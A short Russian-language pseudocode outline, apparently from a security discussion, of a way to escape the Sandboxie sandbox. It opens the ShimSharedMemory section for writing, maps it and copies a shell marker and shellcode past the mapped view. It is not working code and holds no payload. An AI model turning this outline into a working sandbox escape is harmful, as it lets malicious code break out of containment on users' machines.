1. NtOpenSection ( \BaseNamedObjects\ShimSharedMemory, GENERIC_WRITE ) : успех? уже ахтунг
2. baseaddr = NtMapViewOfSection : успех? sandboxie слита
3. memcpy (baseaddr+view_size, shell marker + shell code)
